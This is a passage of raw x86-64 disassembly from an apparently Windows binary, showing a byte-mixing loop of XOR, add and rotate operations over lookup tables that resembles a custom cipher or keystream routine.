   140004db1:	7d 0d                	jge    0x140004dc0
   140004db3:	41 ff cc             	dec    %r12d
   140004db6:	41 81 cc 00 fc ff ff 	or     $0xfffffc00,%r12d
   140004dbd:	41 ff c4             	inc    %r12d
   140004dc0:	41 8d 41 01          	lea    0x1(%r9),%eax
   140004dc4:	4d 63 d4             	movslq %r12d,%r10
   140004dc7:	89 45 88             	mov    %eax,-0x78(%rbp)
   140004dca:	48 8d 0d 2f b2 ff ff 	lea    -0x4dd1(%rip),%rcx        # 0x140000000
   140004dd1:	45 0f b6 84 0b 20 70 	movzbl 0x7020(%r11,%rcx,1),%r8d
   140004dd8:	00 00 
   140004dda:	99                   	cltd
   140004ddb:	44 33 44 24 78       	xor    0x78(%rsp),%r8d
   140004de0:	44 33 45 80          	xor    -0x80(%rbp),%r8d
   140004de4:	47 0f b6 34 32       	movzbl (%r10,%r14,1),%r14d
   140004de9:	45 33 c1             	xor    %r9d,%r8d
   140004dec:	f7 ff                	idiv   %edi
   140004dee:	48 63 c2             	movslq %edx,%rax
   140004df1:	0f b6 0c 30          	movzbl (%rax,%rsi,1),%ecx
   140004df5:	44 03 f9             	add    %ecx,%r15d
   140004df8:	45 03 f8             	add    %r8d,%r15d
   140004dfb:	45 03 fe             	add    %r14d,%r15d
   140004dfe:	41 81 e7 ff 03 00 80 	and    $0x800003ff,%r15d
   140004e05:	7d 0d                	jge    0x140004e14
   140004e07:	41 ff cf             	dec    %r15d
   140004e0a:	41 81 cf 00 fc ff ff 	or     $0xfffffc00,%r15d
   140004e11:	41 ff c7             	inc    %r15d
   140004e14:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140004e19:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140004e1d:	44 8b 4d 88          	mov    -0x78(%rbp),%r9d
   140004e21:	4d 63 df             	movslq %r15d,%r11
   140004e24:	41 0f b6 14 13       	movzbl (%r11,%rdx,1),%edx
   140004e29:	41 8d 04 16          	lea    (%r14,%rdx,1),%eax
   140004e2d:	88 01                	mov    %al,(%rcx)
   140004e2f:	41 0f b6 ce          	movzbl %r14b,%ecx
   140004e33:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004e38:	41 32 cd             	xor    %r13b,%cl
   140004e3b:	41 d0 ee             	shr    $1,%r14b
   140004e3e:	41 88 0c 02          	mov    %cl,(%r10,%rax,1)
   140004e42:	41 0f b6 cd          	movzbl %r13b,%ecx
   140004e46:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004e4b:	2a ca                	sub    %dl,%cl
   140004e4d:	41 80 e5 0f          	and    $0xf,%r13b
   140004e51:	80 e2 07             	and    $0x7,%dl
   140004e54:	41 88 0c 03          	mov    %cl,(%r11,%rax,1)
   140004e58:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004e5d:	48 63 cb             	movslq %ebx,%rcx
   140004e60:	44 30 2c 01          	xor    %r13b,(%rcx,%rax,1)
   140004e64:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004e69:	41 00 14 02          	add    %dl,(%r10,%rax,1)
   140004e6d:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004e72:	45 30 34 03          	xor    %r14b,(%r11,%rax,1)
   140004e76:	41 81 f9 00 10 00 00 	cmp    $0x1000,%r9d
   140004e7d:	0f 8c 9e fe ff ff    	jl     0x140004d21
   140004e83:	33 ff                	xor    %edi,%edi
   140004e85:	44 8b ef             	mov    %edi,%r13d
   140004e88:	48 39 7d 48          	cmp    %rdi,0x48(%rbp)
   140004e8c:	0f 86 ab 06 00 00    	jbe    0x14000553d
   140004e92:	48 8b 45 58          	mov    0x58(%rbp),%rax
   140004e96:	48 98                	cltq
   140004e98:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140004e9c:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140004ea0:	03 c0                	add    %eax,%eax
   140004ea2:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   140004ea6:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   140004eaa:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004eaf:	89 45 88             	mov    %eax,-0x78(%rbp)
   140004eb2:	0f 1f 40 00          	nopl   0x0(%rax)
   140004eb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004ebd:	00 00 00 
   140004ec0:	4a 8d 04 29          	lea    (%rcx,%r13,1),%rax
   140004ec4:	ff c3                	inc    %ebx
   140004ec6:	25 ff 03 00 00       	and    $0x3ff,%eax
   140004ecb:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   140004ecf:	03 d8                	add    %eax,%ebx
   140004ed1:	81 e3 ff 03 00 80    	and    $0x800003ff,%ebx
   140004ed7:	7d 0a                	jge    0x140004ee3
   140004ed9:	ff cb                	dec    %ebx
   140004edb:	81 cb 00 fc ff ff    	or     $0xfffffc00,%ebx
   140004ee1:	ff c3                	inc    %ebx
   140004ee3:	4c 8b 74 24 70       	mov    0x70(%rsp),%r14
   140004ee8:	41 8d 04 1c          	lea    (%r12,%rbx,1),%eax
   140004eec:	49 03 c5             	add    %r13,%rax
   140004eef:	48 63 cb             	movslq %ebx,%rcx
   140004ef2:	0f b6 c0             	movzbl %al,%eax
   140004ef5:	4f 8d 0c 2a          	lea    (%r10,%r13,1),%r9
   140004ef9:	49 03 cd             	add    %r13,%rcx
   140004efc:	33 d2                	xor    %edx,%edx
   140004efe:	46 0f b6 04 30       	movzbl (%rax,%r14,1),%r8d
   140004f03:	48 8b c1             	mov    %rcx,%rax
   140004f06:	48 f7 75 a0          	divq   -0x60(%rbp)
   140004f0a:	0f b6 04 32          	movzbl (%rdx,%rsi,1),%eax
   140004f0e:	44 03 c0             	add    %eax,%r8d
   140004f11:	0f b6 c1             	movzbl %cl,%eax
   140004f14:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004f19:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   140004f1d:	49 8b c1             	mov    %r9,%rax
   140004f20:	44 03 c1             	add    %ecx,%r8d
   140004f23:	83 e0 7f             	and    $0x7f,%eax
   140004f26:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004f2b:	41 83 e1 1f          	and    $0x1f,%r9d
   140004f2f:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   140004f33:	44 03 c1             	add    %ecx,%r8d
   140004f36:	48 8d 0d c3 b0 ff ff 	lea    -0x4f3d(%rip),%rcx        # 0x140000000
   140004f3d:	41 0f b6 84 09 00 70 	movzbl 0x7000(%r9,%rcx,1),%eax
   140004f44:	00 00 
   140004f46:	41 03 c4             	add    %r12d,%eax
   140004f49:	45 0f b6 24 3a       	movzbl (%r10,%rdi,1),%r12d
   140004f4e:	41 03 c0             	add    %r8d,%eax
   140004f51:	44 03 e0             	add    %eax,%r12d
   140004f54:	41 81 e4 ff 03 00 80 	and    $0x800003ff,%r12d
   140004f5b:	7d 0d                	jge    0x140004f6a
   140004f5d:	41 ff cc             	dec    %r12d
   140004f60:	41 81 cc 00 fc ff ff 	or     $0xfffffc00,%r12d
   140004f67:	41 ff c4             	inc    %r12d
   140004f6a:	4b 8d 04 2b          	lea    (%r11,%r13,1),%rax
   140004f6e:	83 e0 1f             	and    $0x1f,%eax
   140004f71:	0f b6 84 08 20 70 00 	movzbl 0x7020(%rax,%rcx,1),%eax
   140004f78:	00 
   140004f79:	8d 14 80             	lea    (%rax,%rax,4),%edx
   140004f7c:	41 8b c4             	mov    %r12d,%eax
   140004f7f:	41 33 d5             	xor    %r13d,%edx
   140004f82:	33 c3                	xor    %ebx,%eax
   140004f84:	33 55 88             	xor    -0x78(%rbp),%edx
   140004f87:	25 ff 03 00 80       	and    $0x800003ff,%eax
   140004f8c:	7d 09                	jge    0x140004f97
   140004f8e:	ff c8                	dec    %eax
   140004f90:	0d 00 fc ff ff       	or     $0xfffffc00,%eax
   140004f95:	ff c0                	inc    %eax
   140004f97:	48 98                	cltq
   140004f99:	0f b6 0c 38          	movzbl (%rax,%rdi,1),%ecx
   140004f9d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140004fa1:	03 d1                	add    %ecx,%edx
   140004fa3:	49 03 c3             	add    %r11,%rax
   140004fa6:	0f b6 c8             	movzbl %al,%ecx
   140004fa9:	42 0f b6 04 31       	movzbl (%rcx,%r14,1),%eax
   140004fae:	41 03 c7             	add    %r15d,%eax
   140004fb1:	45 0f b6 3c 3b       	movzbl (%r11,%rdi,1),%r15d
   140004fb6:	03 c2                	add    %edx,%eax
   140004fb8:	44 03 f8             	add    %eax,%r15d
   140004fbb:	41 81 e7 ff 03 00 80 	and    $0x800003ff,%r15d
   140004fc2:	7d 0d                	jge    0x140004fd1
   140004fc4:	41 ff cf             	dec    %r15d
   140004fc7:	41 81 cf 00 fc ff ff 	or     $0xfffffc00,%r15d
   140004fce:	41 ff c7             	inc    %r15d
   140004fd1:	4d 63 f4             	movslq %r12d,%r14
   140004fd4:	4d 63 d7             	movslq %r15d,%r10
   140004fd7:	4c 63 db             	movslq %ebx,%r11
   140004fda:	4c 89 75 b8          	mov    %r14,-0x48(%rbp)
   140004fde:	41 0f b6 14 3e       	movzbl (%r14,%rdi,1),%edx
   140004fe3:	45 0f b6 04 3a       	movzbl (%r10,%rdi,1),%r8d
   140004fe8:	45 0f b6 0c 3b       	movzbl (%r11,%rdi,1),%r9d
   140004fed:	41 0f b6 c9          	movzbl %r9b,%ecx
   140004ff1:	4c 89 55 98          	mov    %r10,-0x68(%rbp)
   140004ff5:	32 ca                	xor    %dl,%cl
   140004ff7:	45 2a c8             	sub    %r8b,%r9b
   140004ffa:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
   140004ffe:	41 88 04 3b          	mov    %al,(%r11,%rdi,1)
   140005002:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140005007:	41 88 0c 06          	mov    %cl,(%r14,%rax,1)
   14000500b:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140005010:	45 88 0c 02          	mov    %r9b,(%r10,%rax,1)
   140005014:	4c 8b 4c 24 58       	mov    0x58(%rsp),%r9
   140005019:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000501e:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140005022:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140005027:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000502b:	4f 8d 04 0e          	lea    (%r14,%r9,1),%r8
   14000502f:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140005034:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140005038:	43 0f b6 04 0b       	movzbl (%r11,%r9,1),%eax
   14000503d:	43 2a 04 0e          	sub    (%r14,%r9,1),%al
   140005041:	0f b6 c0             	movzbl %al,%eax
   140005044:	6b d0 4d             	imul   $0x4d,%eax,%edx
   140005047:	43 0f b6 04 0a       	movzbl (%r10,%r9,1),%eax
   14000504c:	6b c8 7f             	imul   $0x7f,%eax,%ecx
   14000504f:	49 63 c5             	movslq %r13d,%rax
   140005052:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005056:	4c 89 45 d0          	mov    %r8,-0x30(%rbp)
   14000505a:	02 d1                	add    %cl,%dl
   14000505c:	48 ff c0             	inc    %rax
   14000505f:	89 55 80             	mov    %edx,-0x80(%rbp)
   140005062:	33 d2                	xor    %edx,%edx
   140005064:	48 f7 75 58          	divq   0x58(%rbp)
   140005068:	0f b6 45 80          	movzbl -0x80(%rbp),%eax
   14000506c:	02 04 32             	add    (%rdx,%rsi,1),%al
   14000506f:	43 30 04 0b          	xor    %al,(%r11,%r9,1)
   140005073:	41 8d 45 03          	lea    0x3(%r13),%eax
   140005077:	25 ff 00 00 80       	and    $0x800000ff,%eax
   14000507c:	7d 09                	jge    0x140005087
   14000507e:	ff c8                	dec    %eax
   140005080:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140005085:	ff c0                	inc    %eax
   140005087:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
   14000508b:	8b 55 80             	mov    -0x80(%rbp),%edx
   14000508e:	0f b6 ca             	movzbl %dl,%ecx
   140005091:	48 98                	cltq
   140005093:	32 0c 38             	xor    (%rax,%rdi,1),%cl
   140005096:	41 8d 45 05          	lea    0x5(%r13),%eax
   14000509a:	41 00 08             	add    %cl,(%r8)
   14000509d:	4b 8d 0c 0a          	lea    (%r10,%r9,1),%rcx
   1400050a1:	48 8b 7d 58          	mov    0x58(%rbp),%rdi
   1400050a5:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   1400050a9:	25 7f 00 00 80       	and    $0x8000007f,%eax
   1400050ae:	7d 07                	jge    0x1400050b7
   1400050b0:	ff c8                	dec    %eax
   1400050b2:	83 c8 80             	or     $0xffffff80,%eax
   1400050b5:	ff c0                	inc    %eax
   1400050b7:	4c 8b 45 e0          	mov    -0x20(%rbp),%r8
   1400050bb:	48 98                	cltq
   1400050bd:	42 2a 14 00          	sub    (%rax,%r8,1),%dl
   1400050c1:	4b 8d 04 0b          	lea    (%r11,%r9,1),%rax
   1400050c5:	30 11                	xor    %dl,(%rcx)
   1400050c7:	33 d2                	xor    %edx,%edx
   1400050c9:	44 0f b6 18          	movzbl (%rax),%r11d
   1400050cd:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400050d1:	45 8b cb             	mov    %r11d,%r9d
   1400050d4:	44 33 4c 24 78       	xor    0x78(%rsp),%r9d
   1400050d9:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400050dd:	41 83 e1 03          	and    $0x3,%r9d
   1400050e1:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400050e5:	41 ff c1             	inc    %r9d
   1400050e8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400050ec:	48 f7 f7             	div    %rdi
   1400050ef:	44 0f b6 11          	movzbl (%rcx),%r10d
   1400050f3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400050f8:	41 2a c9             	sub    %r9b,%cl
   1400050fb:	45 33 d5             	xor    %r13d,%r10d
   1400050fe:	41 83 e2 03          	and    $0x3,%r10d
   140005102:	41 ff c2             	inc    %r10d
   140005105:	0f b6 04 32          	movzbl (%rdx,%rsi,1),%eax
   140005109:	44 33 c0             	xor    %eax,%r8d
   14000510c:	41 0f b6 c3          	movzbl %r11b,%eax
   140005110:	d2 e8                	shr    %cl,%al
   140005112:	41 83 e0 03          	and    $0x3,%r8d
   140005116:	41 8b c9             	mov    %r9d,%ecx
   140005119:	41 ff c0             	inc    %r8d
   14000511c:	4c 8b 4d d0          	mov    -0x30(%rbp),%r9
   140005120:	41 d2 e3             	shl    %cl,%r11b
   140005123:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005128:	41 0a c3             	or     %r11b,%al
   14000512b:	41 2a ca             	sub    %r10b,%cl
   14000512e:	4c 8b 5d 80          	mov    -0x80(%rbp),%r11
   140005132:	41 88 03             	mov    %al,(%r11)
   140005135:	41 0f b6 11          	movzbl (%r9),%edx
   140005139:	0f b6 c2             	movzbl %dl,%eax
   14000513c:	d2 e8                	shr    %cl,%al
   14000513e:	41 8b ca             	mov    %r10d,%ecx
   140005141:	4c 8b 55 c0          	mov    -0x40(%rbp),%r10
   140005145:	d2 e2                	shl    %cl,%dl
   140005147:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000514c:	0a c2                	or     %dl,%al
   14000514e:	41 2a c8             	sub    %r8b,%cl
   140005151:	41 88 01             	mov    %al,(%r9)
   140005154:	41 0f b6 12          	movzbl (%r10),%edx
   140005158:	0f b6 c2             	movzbl %dl,%eax
   14000515b:	d2 e8                	shr    %cl,%al
   14000515d:	41 8b c8             	mov    %r8d,%ecx
   140005160:	d2 e2                	shl    %cl,%dl
   140005162:	0a c2                	or     %dl,%al
   140005164:	41 88 02             	mov    %al,(%r10)
   140005167:	41 f6 c5 01          	test   $0x1,%r13b
   14000516b:	75 53                	jne    0x1400051c0
   14000516d:	41 8b c5             	mov    %r13d,%eax
   140005170:	99                   	cltd
   140005171:	2b c2                	sub    %edx,%eax
   140005173:	d1 f8                	sar    $1,%eax
   140005175:	8b c8                	mov    %eax,%ecx
   140005177:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
   14000517d:	7d 0a                	jge    0x140005189
   14000517f:	ff c9                	dec    %ecx
   140005181:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
   140005187:	ff c1                	inc    %ecx
   140005189:	4c 8b 45 d8          	mov    -0x28(%rbp),%r8
   14000518d:	48 63 d1             	movslq %ecx,%rdx
   140005190:	41 0f b6 0b          	movzbl (%r11),%ecx
   140005194:	42 30 0c 02          	xor    %cl,(%rdx,%r8,1)
   140005198:	25 7f 00 00 80       	and    $0x8000007f,%eax
   14000519d:	7d 07                	jge    0x1400051a6
   14000519f:	ff c8                	dec    %eax
   1400051a1:	83 c8 80             	or     $0xffffff80,%eax
   1400051a4:	ff c0                	inc    %eax
   1400051a6:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400051aa:	48 98                	cltq
   1400051ac:	48 03 c8             	add    %rax,%rcx
   1400051af:	41 0f b6 01          	movzbl (%r9),%eax
   1400051b3:	00 01                	add    %al,(%rcx)
   1400051b5:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1400051b9:	41 0f b6 02          	movzbl (%r10),%eax
   1400051bd:	30 04 0a             	xor    %al,(%rdx,%rcx,1)
   1400051c0:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400051c5:	41 8b c7             	mov    %r15d,%eax
   1400051c8:	48 63 fb             	movslq %ebx,%rdi
   1400051cb:	48 03 f9             	add    %rcx,%rdi
   1400051ce:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400051d3:	7d 09                	jge    0x1400051de
   1400051d5:	ff c8                	dec    %eax
   1400051d7:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400051dc:	ff c0                	inc    %eax
   1400051de:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400051e3:	48 98                	cltq
   1400051e5:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
   1400051e9:	33 d2                	xor    %edx,%edx
   1400051eb:	44 6b d8 71          	imul   $0x71,%eax,%r11d
   1400051ef:	41 0f b6 04 0e       	movzbl (%r14,%rcx,1),%eax
   1400051f4:	6b c8 63             	imul   $0x63,%eax,%ecx
   1400051f7:	0f b6 07             	movzbl (%rdi),%eax
   1400051fa:	44 2a d9             	sub    %cl,%r11b
   1400051fd:	6b c8 39             	imul   $0x39,%eax,%ecx
   140005200:	49 8d 45 07          	lea    0x7(%r13),%rax
   140005204:	44 2a d9             	sub    %cl,%r11b
   140005207:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   14000520b:	48 f7 f1             	div    %rcx
   14000520e:	41 8d 04 1c          	lea    (%r12,%rbx,1),%eax
   140005212:	44 32 1c 32          	xor    (%rdx,%rsi,1),%r11b
   140005216:	25 7f 00 00 80       	and    $0x8000007f,%eax
   14000521b:	7d 07                	jge    0x140005224
   14000521d:	ff c8                	dec    %eax
   14000521f:	83 c8 80             	or     $0xffffff80,%eax
   140005222:	ff c0                	inc    %eax
   140005224:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140005229:	48 8d 15 d0 ad ff ff 	lea    -0x5230(%rip),%rdx        # 0x140000000
   140005230:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   140005235:	49 8b f5             	mov    %r13,%rsi
   140005238:	4c 8b 55 50          	mov    0x50(%rbp),%r10
   14000523c:	83 e6 7f             	and    $0x7f,%esi
   14000523f:	48 98                	cltq
   140005241:	45 0f b6 f5          	movzbl %r13b,%r14d
   140005245:	46 32 1c 08          	xor    (%rax,%r9,1),%r11b
   140005249:	49 8d 45 0b          	lea    0xb(%r13),%rax
   14000524d:	83 e0 1f             	and    $0x1f,%eax
   140005250:	44 32 9c 10 00 70 00 	xor    0x7000(%rax,%rdx,1),%r11b
   140005257:	00 
   140005258:	0f b6 45 b0          	movzbl -0x50(%rbp),%eax
   14000525c:	46 32 1c 00          	xor    (%rax,%r8,1),%r11b
   140005260:	49 8d 45 0d          	lea    0xd(%r13),%rax
   140005264:	83 e0 1f             	and    $0x1f,%eax
   140005267:	44 32 9c 10 20 70 00 	xor    0x7020(%rax,%rdx,1),%r11b
   14000526e:	00 
   14000526f:	33 d2                	xor    %edx,%edx
   140005271:	49 8b c5             	mov    %r13,%rax
   140005274:	44 89 5d 80          	mov    %r11d,-0x80(%rbp)
   140005278:	48 f7 f1             	div    %rcx
   14000527b:	0f b6 4c 24 50       	movzbl 0x50(%rsp),%ecx
   140005280:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140005285:	33 d2                	xor    %edx,%edx
   140005287:	48 03 c1             	add    %rcx,%rax
   14000528a:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000528f:	49 03 c5             	add    %r13,%rax
   140005292:	0f b6 c0             	movzbl %al,%eax
   140005295:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   140005299:	49 8d 45 05          	lea    0x5(%r13),%rax
   14000529d:	48 f7 75 a0          	divq   -0x60(%rbp)
   1400052a1:	42 02 0c 0e          	add    (%rsi,%r9,1),%cl
   1400052a5:	43 02 0c 06          	add    (%r14,%r8,1),%cl
   1400052a9:	48 8b 45 58          	mov    0x58(%rbp),%rax
   1400052ad:	41 02 cb             	add    %r11b,%cl
   1400052b0:	00 0f                	add    %cl,(%rdi)
   1400052b2:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
   1400052b7:	42 0f b6 14 12       	movzbl (%rdx,%r10,1),%edx
   1400052bc:	48 8b 7d b8          	mov    -0x48(%rbp),%rdi
   1400052c0:	41 33 d5             	xor    %r13d,%edx
   1400052c3:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
   1400052c8:	49 03 f8             	add    %r8,%rdi
   1400052cb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400052d0:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400052d5:	4c 89 54 24 30       	mov    %r10,0x30(%rsp)
   1400052da:	0f b6 0f             	movzbl (%rdi),%ecx
   1400052dd:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400052e2:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400052e7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400052ec:	e8 bf e8 ff ff       	call   0x140003bb0
   1400052f1:	4c 8b 45 98          	mov    -0x68(%rbp),%r8
   1400052f5:	88 07                	mov    %al,(%rdi)
   1400052f7:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400052fc:	4c 03 44 24 58       	add    0x58(%rsp),%r8
   140005301:	41 0f b6 0c 06       	movzbl (%r14,%rax,1),%ecx
   140005306:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   14000530b:	0f b6 14 06          	movzbl (%rsi,%rax,1),%edx
   14000530f:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140005314:	02 d1                	add    %cl,%dl
   140005316:	41 02 14 06          	add    (%r14,%rax,1),%dl
   14000531a:	02 55 80             	add    -0x80(%rbp),%dl
   14000531d:	41 30 10             	xor    %dl,(%r8)
   140005320:	41 f6 c5 03          	test   $0x3,%r13b
   140005324:	0f 85 03 01 00 00    	jne    0x14000542d
   14000532a:	41 8b c5             	mov    %r13d,%eax
   14000532d:	99                   	cltd
   14000532e:	83 e2 03             	and    $0x3,%edx
   140005331:	03 c2                	add    %edx,%eax
   140005333:	c1 f8 02             	sar    $0x2,%eax
   140005336:	8b c8                	mov    %eax,%ecx
   140005338:	44 8b c0             	mov    %eax,%r8d
   14000533b:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
   140005341:	7d 0a                	jge    0x14000534d
   140005343:	ff c9                	dec    %ecx
   140005345:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
   14000534b:	ff c1                	inc    %ecx
   14000534d:	4c 8b 5c 24 60       	mov    0x60(%rsp),%r11
   140005352:	4c 63 c9             	movslq %ecx,%r9
   140005355:	41 8b c8             	mov    %r8d,%ecx
   140005358:	81 e1 7f 00 00 80    	and    $0x8000007f,%ecx
   14000535e:	7d 07                	jge    0x140005367
   140005360:	ff c9                	dec    %ecx
   140005362:	83 c9 80             	or     $0xffffff80,%ecx
   140005365:	ff c1                	inc    %ecx
   140005367:	4c 63 d1             	movslq %ecx,%r10
   14000536a:	25 1f 00 00 80       	and    $0x8000001f,%eax
   14000536f:	7d 07                	jge    0x140005378
   140005371:	ff c8                	dec    %eax
   140005373:	83 c8 e0             	or     $0xffffffe0,%eax
   140005376:	ff c0                	inc    %eax
   140005378:	4c 8b 75 58          	mov    0x58(%rbp),%r14
   14000537c:	48 8b 75 50          	mov    0x50(%rbp),%rsi
   140005380:	48 63 f8             	movslq %eax,%rdi
   140005383:	41 8d 40 07          	lea    0x7(%r8),%eax
   140005387:	99                   	cltd
   140005388:	41 f7 fe             	idiv   %r14d
   14000538b:	48 63 c2             	movslq %edx,%rax
   14000538e:	48 63 d3             	movslq %ebx,%rdx
   140005391:	0f b6 0c 30          	movzbl (%rax,%rsi,1),%ecx
   140005395:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   14000539a:	c0 e9 02             	shr    $0x2,%cl
   14000539d:	41 32 0c 02          	xor    (%r10,%rax,1),%cl
   1400053a1:	48 8d 05 58 ac ff ff 	lea    -0x53a8(%rip),%rax        # 0x140000000
   1400053a8:	32 8c 07 00 70 00 00 	xor    0x7000(%rdi,%rax,1),%cl
   1400053af:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400053b4:	41 32 0c 01          	xor    (%r9,%rax,1),%cl
   1400053b8:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400053bd:	32 0c 02             	xor    (%rdx,%rax,1),%cl
   1400053c0:	41 8d 40 05          	lea    0x5(%r8),%eax
   1400053c4:	43 32 0c 0b          	xor    (%r11,%r9,1),%cl
   1400053c8:	99                   	cltd
   1400053c9:	32 4c 24 50          	xor    0x50(%rsp),%cl
   1400053cd:	41 f7 fe             	idiv   %r14d
   1400053d0:	43 88 0c 0b          	mov    %cl,(%r11,%r9,1)
   1400053d4:	41 8d 40 0b          	lea    0xb(%r8),%eax
   1400053d8:	4c 03 54 24 68       	add    0x68(%rsp),%r10
   1400053dd:	48 63 d2             	movslq %edx,%rdx
   1400053e0:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400053e5:	7d 09                	jge    0x1400053f0
   1400053e7:	ff c8                	dec    %eax
   1400053e9:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400053ee:	ff c0                	inc    %eax
   1400053f0:	0f b6 14 32          	movzbl (%rdx,%rsi,1),%edx
   1400053f4:	48 63 c8             	movslq %eax,%rcx
   1400053f7:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1400053fc:	32 14 01             	xor    (%rcx,%rax,1),%dl
   1400053ff:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140005404:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   140005408:	0f b6 0c 01          	movzbl (%rcx,%rax,1),%ecx
   14000540c:	48 8d 05 ed ab ff ff 	lea    -0x5413(%rip),%rax        # 0x140000000
   140005413:	41 02 0a             	add    (%r10),%cl
   140005416:	32 d1                	xor    %cl,%dl
   140005418:	32 94 07 20 70 00 00 	xor    0x7020(%rdi,%rax,1),%dl
   14000541f:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140005424:	41 32 14 01          	xor    (%r9,%rax,1),%dl
   140005428:	41 88 12             	mov    %dl,(%r10)
   14000542b:	eb 08                	jmp    0x140005435
   14000542d:	48 8b 75 50          	mov    0x50(%rbp),%rsi
   140005431:	4c 8b 75 58          	mov    0x58(%rbp),%r14
   140005435:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000543a:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   14000543f:	48 8b cf             	mov    %rdi,%rcx
   140005442:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140005447:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000544c:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140005451:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140005456:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   14000545b:	44 89 7c 24 30       	mov    %r15d,0x30(%rsp)
   140005460:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140005465:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005469:	e8 32 01 00 00       	call   0x1400055a0
   14000546e:	48 8b 55 40          	mov    0x40(%rbp),%rdx
   140005472:	48 83 45 a8 03       	addq   $0x3,-0x58(%rbp)
   140005477:	48 83 45 b0 11       	addq   $0x11,-0x50(%rbp)
   14000547c:	4c 8b 55 b8          	mov    -0x48(%rbp),%r10
   140005480:	42 30 04 2a          	xor    %al,(%rdx,%r13,1)
   140005484:	49 ff c5             	inc    %r13
   140005487:	4c 8b 5d 98          	mov    -0x68(%rbp),%r11
   14000548b:	48 63 cb             	movslq %ebx,%rcx
   14000548e:	4c 3b 6d 48          	cmp    0x48(%rbp),%r13
   140005492:	0f 82 28 fa ff ff    	jb     0x140004ec0
   140005498:	b8 01 00 00 00       	mov    $0x1,%eax
   14000549d:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   1400054a1:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400054a6:	48 2b c2             	sub    %rdx,%rax
   1400054a9:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400054ad:	33 db                	xor    %ebx,%ebx
